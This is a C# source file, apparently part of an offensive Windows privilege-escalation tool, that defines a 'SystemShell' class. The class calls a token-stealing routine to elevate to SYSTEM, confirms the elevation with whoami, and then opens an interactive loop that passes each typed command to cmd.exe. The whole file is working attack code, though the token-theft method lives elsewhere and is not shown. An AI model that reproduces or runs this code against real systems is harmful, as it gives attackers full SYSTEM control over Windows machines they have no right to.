using System;
using System.Diagnostics;

namespace KernelMode.Privilege
{
    public static class SystemShell
    {
        public static void Start()
        {
            Console.WriteLine("[*] Attempting to start an interactive SYSTEM shell...");

            // First, ensure we have SYSTEM privileges.
            Console.WriteLine("[*] Elevating privileges to SYSTEM...");
            TokenManipulator.StealSystemToken();
            
            // Check if we're SYSTEM by examining process token
            bool isSystem = CheckIfSystem();
            if (!isSystem)
            {
                Console.WriteLine("[-] Failed to elevate to SYSTEM. Cannot start shell.");
                return;
            }

            Console.WriteLine("[+] Privileges elevated. Starting interactive SYSTEM shell.");
            Console.WriteLine("Type 'exit' to return to the main menu.");
            Console.WriteLine();

            while (true)
            {
                Console.Write($"{Environment.CurrentDirectory}>");
                string command = Console.ReadLine();

                if (string.IsNullOrWhiteSpace(command))
                {
                    continue;
                }

                if (command.Trim().ToLower() == "exit")
                {
                    break;
                }

                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                try
                {
                    using (var process = Process.Start(startInfo))
                    {
                        // Read output and error streams synchronously
                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();

                        process.WaitForExit();

                        if (!string.IsNullOrEmpty(output))
                        {
                            Console.WriteLine(output);
                        }
                        if (!string.IsNullOrEmpty(error))
                        {
                            Console.Error.WriteLine(error);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error executing command: {ex.Message}");
                }
            }

            Console.WriteLine("[*] Exited SYSTEM shell.");
        }
        
        private static bool CheckIfSystem()
        {
            try
            {
                // A simple check to see if we're running as SYSTEM
                using (var process = Process.Start(new ProcessStartInfo
                {
                    FileName = "whoami",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }))
                {
                    string output = process.StandardOutput.ReadToEnd().Trim().ToLower();
                    process.WaitForExit();
                    return output.Contains("system") || output.Contains("nt authority\\system");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error checking privileges: {ex.Message}");
                return false;
            }
        }
    }
}